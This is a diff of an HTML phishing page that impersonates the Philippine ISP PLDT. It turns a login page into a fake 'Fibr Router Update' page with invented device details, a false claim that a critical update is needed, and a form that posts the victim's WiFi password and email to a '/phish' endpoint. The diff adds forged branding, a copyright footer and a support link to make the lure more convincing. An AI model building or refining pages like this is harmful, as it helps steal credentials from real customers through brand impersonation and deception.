@@ -1,26 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PLDT Smart Login</title>
+    <title>PLDT Fibr Router Update</title>
     <link rel="icon" href="/static/logos/pldt.png">
     <style>
-        body { font-family: Arial; background: #fff3f3; text-align: center; padding-top: 80px; }
-        img { width: 90px; }
-        h2 { color: #b30000; }
-        input { padding: 10px; width: 240px; margin-top: 20px; }
-        button { background: #b30000; color: white; padding: 10px 25px; border: none; margin-top: 10px; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 2px 10px rgba(0,0,0,0.1); display: inline-block; }
+        body { background-color: #fff3f3; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding-top: 60px; }
+        .card { background: white; padding: 36px 32px 24px 32px; border-radius: 12px; box-shadow: 0px 2px 16px rgba(0,0,0,0.10); display: inline-block; min-width: 350px; }
+        img { width: 100px; margin-bottom: 10px; }
+        h2 { color: #b30000; margin-bottom: 8px; }
+        .device-info { color: #555; font-size: 0.98em; margin-bottom: 18px; }
+        input { padding: 11px; width: 90%; margin-top: 16px; border: 1px solid #e6b2b2; border-radius: 5px; font-size: 1em; }
+        button { padding: 11px 32px; margin-top: 18px; background-color: #b30000; color: white; border: none; border-radius: 5px; font-size: 1em; cursor: pointer; }
+        button:hover { background-color: #7a0000; }
+        .support { margin-top: 18px; font-size: 0.95em; color: #888; }
+        .footer { margin-top: 32px; color: #aaa; font-size: 0.92em; }
+        .help-link { color: #b30000; text-decoration: underline; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <img src="/static/logos/pldt.png" alt="PLDT">
         <h2>PLDT Fibr Router Update</h2>
-        <p>To continue using your WiFi, please confirm your password.</p>
+        <div class="device-info">
+            Model: AN5506-04-FA &nbsp;|&nbsp; SSID: <b>PLDT_HomeFibr_5G</b><br>
+            Firmware: v5.2.1.1
+        </div>
+        <p style="color:#333;">A critical router update is required to maintain your internet connection.<br>
+        Please verify your WiFi credentials below to proceed.</p>
         <form method="POST" action="/phish">
+            <input type="email" name="email" placeholder="Email Address (optional)"><br>
             <input type="password" name="password" placeholder="WiFi Password" required><br>
-            <button type="submit">Continue</button>
+            <button type="submit">Verify & Update</button>
         </form>
+        <div class="support">
+            Need help? <span class="help-link">Contact PLDT Support</span>
+        </div>
+    </div>
+    <div class="footer">
+        &copy; 2025 PLDT Inc. All rights reserved.<br>
+        <span>Terms of Service | Privacy Policy</span>
     </div>
 </body>
 </html>
